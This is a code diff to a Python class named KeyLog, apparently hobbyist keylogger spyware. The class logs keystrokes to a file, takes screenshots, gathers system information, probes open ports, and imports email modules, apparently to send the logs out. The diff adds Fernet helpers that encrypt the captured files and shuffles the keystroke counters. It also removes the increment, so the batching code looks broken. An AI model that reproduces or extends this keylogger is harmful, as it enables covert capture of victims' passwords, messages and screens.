@@ -18,11 +18,13 @@ from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email import encoders
-
+from cryptography.fernet import Fernet
 class KeyLog():
-  logging.basicConfig(filename = ("keylog.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')
-  
+
+  logging.basicConfig(filename = ("keylog.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')  
   working_os = platform.system()
+  count = 0
+  unsorted_data = []
 
   # files
   sys_info = 'systeminfo.txt'
@@ -41,6 +43,35 @@ class KeyLog():
       image.save(self.screenshots_logged, 'PNG')
 
   # screenshotWinMacLin()
+
+  def createKey(self):
+    cryptKey = Fernet.generate_key()
+    return cryptKey
+  
+  def writeKey(self, cryptKey, key_stored_file):
+      with open(key_stored_file, 'wb') as keyFile:
+          keyFile.write(cryptKey)
+
+  def loadKey(self, key_stored_file):
+      with open(key_stored_file, 'rb') as keyFile:
+          cryptKey = keyFile.read()
+      return cryptKey
+
+  def encryptFile(self, cryptKey, file_to_be_encrypted, encrypted_file):
+      f = Fernet(cryptKey)
+      with open(file_to_be_encrypted, 'rb') as current_file:
+          before_encryption = current_file.read()        
+      encrypted = f.encrypt(before_encryption)
+      with open(encrypted_file, 'wb') as current_file:
+          current_file.write(encrypted)
+
+  def decryptFile(self, cryptKey, file_to_be_decrypted, decrypted_file):
+      f = Fernet(cryptKey)
+      with open(file_to_be_decrypted, 'rb') as decrypt_file:
+          before_decryption = decrypt_file.read()
+      decrypted = f.decrypt(before_decryption)
+      with open(decrypted_file, 'wb') as decrypt_file:
+          decrypt_file.write(decrypted)
 
   # Check for open ports in the system
   def check_open_port(self, host, port):
@@ -118,17 +149,11 @@ class KeyLog():
           print("[-] Something went wrong! ...", e)
 
 
-
-  count = 0
-  unsorted_data = []
-
   # Record Keystrokes
   def on_press(self, key):
     global count, unsorted_data, currentTime
     logging.info(str(key))
     self.unsorted_data.append(str(key))
-    self.count += 1
-    currentTime = time.time()
     
     if self.count >= 20:
       count = 0
